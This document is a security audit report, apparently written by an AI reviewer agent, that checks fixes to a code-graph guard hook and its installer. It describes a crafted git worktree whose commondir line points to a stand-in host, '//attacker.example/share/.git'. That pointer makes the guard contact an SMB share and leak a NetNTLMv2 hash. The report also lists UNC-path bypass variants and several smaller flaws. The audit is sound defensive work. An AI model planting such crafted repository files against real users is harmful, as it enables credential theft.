# Security Audit, pass 2: issue #259 fixes (uncommitted change set on fix/259-codegraph-guard-fail-open)

Reviewer: security-auditor (fresh context), 2026-11-05
Contract: `.claude/concepts/2026-11-05-codegraph-guard-fail-open.md` (approved)
First audit: `review-security-auditor.md` (W1-W4, N1-N7)
Scope: the fixes for W1, W3, N1, N2, N5 and the safe part of W4; any new write, delete or path-follow in the diff.
W2 (no owner check on Windows) and the W4 refusal-to-finding change are HELD for the user and are not reported here.

Method: a static read of the guard, tracker, reset, `_project_paths.py`, `_claude_paths.py`, `_error_log.py` and the
installer's grant and index-note code, plus two local probes under `%TEMP%\sa259\` (no network: every `//` path was
caught by a wrapper before it reached the OS).

## WARN

### P2-W1. W3 is not closed: the `commondir` hop still sends the guard and the installer to a UNC host
- `.claude/hooks/_project_paths.py:593-601` (`_git_file_kind`: `fh.readline()` of `commondir`, then
  `os.path.realpath(os.path.join(target, relative))` and `os.path.isdir(common)`, with no `//` refusal)
- consumed by `codegraph-first-guard.py:423-427` (`_main_candidate` asks `_pp_main_checkout_root` FIRST),
  `:467` (`_has_project_index(candidate)` lstats it), `:553-556` and `:523-528` (`_server_state_at` opens
  `<candidate>/.mcp.json`, `.claude/settings.json`, `.claude/settings.local.json`), `:470-474` (`realpath(main)`)
- and by the installer's `_codegraph_index_notes`, `auto_improve_finish_install.py:2576, 2601, 2605, 2612-2614`

The fix refuses a hostile `gitdir:` line. It does not refuse the second pointer git uses. `gitdir:` may point to a
LOCAL folder the attacker ships in the same archive, which passes every check (no `//`, holds `/.git/worktrees/`).
The `commondir` file inside that folder is then followed with no check at all.

**Exploit scenario (reproduced locally with the network calls stubbed).**
1. The archive root holds `.git` = `gitdir: evil/.git/worktrees/x` and
   `evil/.git/worktrees/x/commondir` = `//attacker.example/share/.git`.
2. The victim starts a session there and the agent makes its first source Read.
3. `tree_kind` returns `linked-worktree`; `main_checkout_root` returns `//attacker.example/share/`. The probe recorded
   `realpath('//attacker.example/share/.git')` and `isdir('//attacker.example/share/.git')`, twice, before the guard
   even uses the candidate. The guard then lstats `\\attacker.example\share\.codegraph` and opens three files on
   the share. Windows authenticates over SMB and leaks a NetNTLMv2 hash; the hook stalls for the SMB timeout.

Same class, same mitigating fact as the first audit's W3 (git itself reads `commondir` at `git status`), so the
severity stays WARN. But the change set claims W3 closed, the tests (`test_codegraph_first_guard.py:892-1000`,
`HOSTILE_GITDIRS` and `run_hostile_git_file_kind`) cover only the first hop, and the green tests give a false
assurance. The guard's inline copy (`_inline_own_root`) does not help: `_main_candidate` prefers
`_pp_main_checkout_root`, and with a `_project_paths.py` from an earlier release (the add-on keeps an existing
helper) that function has no refusal at all.

**Fix.**
- In `_git_file_kind`: read `commondir` through the same 4096-byte cap; refuse (`undecidable`) when `relative`
  starts with `//` after `\` to `/`, or when `os.path.normpath(os.path.join(target, relative))` does, BEFORE any
  `realpath`/`isdir`; after `realpath`, refuse again when the result starts with `//` or `\\` (a link to a share).
- Consumer side, so an older helper cannot reopen it: in the guard's `_main_candidate` and the installer's
  `main_candidate`, drop a candidate whose `replace("\\", "/")` starts with `//` (one helper `_is_remote(path)`).
- Add rows: a local gitdir whose `commondir` is `//<FAKE_HOST>/share/.git`, `\\<FAKE_HOST>\share\.git` and
  `\\?\UNC\<FAKE_HOST>\share\.git`; assert `undecidable`/`None` and that `watch_fake_host` recorded nothing, for
  `tree_kind`, `main_checkout_root`, the guard end to end and `_codegraph_index_notes`.

## NIT

- **P2-N1. Unbounded `commondir` read.** `_project_paths.py:596-597` `fh.readline()` with no limit, text mode. The
  N1 cap was applied to `.git` only. A multi-GB `commondir` with no newline is read whole. Covered by the P2-W1 fix.
- **P2-N2. A first line over 4096 bytes is truncated, not refused.** `_read_gitdir_line`
  (`_project_paths.py:579-581`), `guard:398`, `_claude_paths.py` inline copy: `fh.read(4096).split(b"\n", 1)[0]`
  uses the first 4096 bytes when no newline is found. The docstrings say such a line is undecidable. A line
  `gitdir: C:/r/.git/worktrees/` + 5000 bytes is accepted as its prefix, which is not the folder git would use.
  No escape (the prefix still passes the `//` and marker tests), but behaviour and contract disagree; and a
  multi-byte character cut at byte 4096 yields `(None, None)` instead of `(F, None)`. Fix: if the read returned
  4096 bytes and holds no `\n`, return undecidable; add the row `gitdir: <valid prefix>/.git/worktrees/` + padding.
- **P2-N3. A leftover `.tmp-<16 hex>` keeps a session folder forever.** `codegraph-turn-reset.py:50`
  (`KNOWN_FILE_RE`) does not list the new temp name. A hook killed between `os.open` and `os.replace` (host
  timeout) leaves one, and `_eligible_files` then keeps the folder. Fail-safe, but an unbounded temp leak. Fix: add
  `\.tmp-[0-9a-f]{16}` to `KNOWN_FILE_RE` (the plain-file and link checks already apply) and a pruner row.
- **P2-N4. The prerequisite server name has no grammar, so the grant check can be widened from the other side.**
  `auto_improve_finish_install.py:2029-2031` accepts any non-empty string as a prerequisite `name`, and
  `_grant_server` (`:2076-2081`) builds the allowed entries from it. A manifest with prerequisite `name: "*"` makes
  `mcp__*` / `mcp__*__*` pass validation. `Bash(*)`, `mcp__*` with the real name, `mcp__codegraph2__*`, padded
  whitespace and lookalike letters are all refused today (exact string equality). Plugin-controlled input, so NIT.
  Fix: require prerequisite names to match `[A-Za-z0-9][A-Za-z0-9_-]*` with no `__`.
- **P2-N5. `C:foo` drive-relative gitdir is accepted.** `_gitdir_pointer` returns `C:foo/.git/worktrees/y`, which
  resolves against the process's per-drive cwd of `C:`. Local only, no escape. Optional: require the joined target
  to be absolute (`os.path.isabs`).

## Verified closed

- **W1 (link at the final name).** `guard:258-278` and `tracker:103-121`: a random `.tmp-` + 16 hex sibling
  (`os.urandom(8)`, 64 bits, unpredictable), `O_CREAT|O_EXCL` (+`O_NOFOLLOW` on POSIX, `O_BINARY` on Windows), mode
  `0600`, then `os.replace`. Probed on this Windows host: a file symlink planted at `turn.json` is REPLACED (victim
  file unchanged, the name is a plain file afterwards); a hard link planted there is unlinked from that name (victim
  unchanged); a folder or junction at the final name makes `os.replace` raise `PermissionError`, the temp is
  removed and the write returns False (fail-open `state-unwritable` for a ticket, a logged miss for the marker).
  `create_once` (`guard:339-350`) and the reset's `pruned` flag use `O_EXCL`, which refuses an existing link.
  Folder-swap residue between `ensure_folder` and `os.replace` is same-user on POSIX and W2 on Windows (held).
- **N1 for `.git`.** 4096-byte read cap in all three copies.
- **W3 first hop.** `//host`, `\\host`, `\\?\UNC\`, `\\?\C:\`, `\\.\`, `/\host`, `\/host`, leading
  whitespace, `..` that collapses toward `//`, and `\??\UNC\...` (becomes `D:/??/...`, an invalid Win32 name) are
  all refused or harmless; a target without `/.git/worktrees/` or `/.git/modules/` is refused; the refusal runs
  before any stat. The three copies (`_project_paths._gitdir_pointer`, `guard._inline_own_root.pointer`,
  `_claude_paths._inline_worktree_own_root.pointer`) are text-equivalent.
- **N2.** All four grammars (`guard:202`, `tracker:37`, `reset:53`, `_project_paths.py:880`) are
  `[A-Za-z0-9](?:[A-Za-z0-9._-]{0,126}[A-Za-z0-9_-])?`: no trailing `.`, no space, no `:` (no alternate data
  stream), max 128; the fixed prefixes rule out `CON`/`NUL`/`COM1`. For `_project_paths._marker_path` a newly
  rejected id means no session-start marker, which makes the database guards act: the safe direction.
- **N5 and `log_event` returning a bool.** The return value carries no data. The only caller that reads it is the
  guard (`:921-926`); every other caller ignores it. An older `_error_log.py` (returns `None`) and the guard's own
  stub are treated as written, which is exactly the pre-fix behaviour (one record per reason), not a fail-unsafe
  path. With logging off (`LOG_DIR` absent, the default) the flag is never created, so each fail-open call costs one
  extra `exists()` stat; the stderr line is printed on every call either way.
- **W4 safe part.** Manifest validation (`:2055-2064`) admits only `mcp__<prerequisite>__*` or
  `mcp__<prerequisite>` by exact equality. The preview note (`:2735-2740`) says the entry covers every current and
  future tool of the named server and is written to the committed settings file; the install skill tells the agent
  to relay `notes` (`SKILL.md:131`). See P2-N4 for the remaining gap.
- **New file operations in the diff.** No new delete, rename or write outside the session folder and the existing
  installer writer; `hooks.json` changed comment text only.

## Verdict

NEEDS FIXES: P2-W1 shows the W3 fix covers one of two pointers. The guard still reaches a UNC host through
`commondir` on the first source Read in a crafted folder. Everything else claimed fixed is fixed.
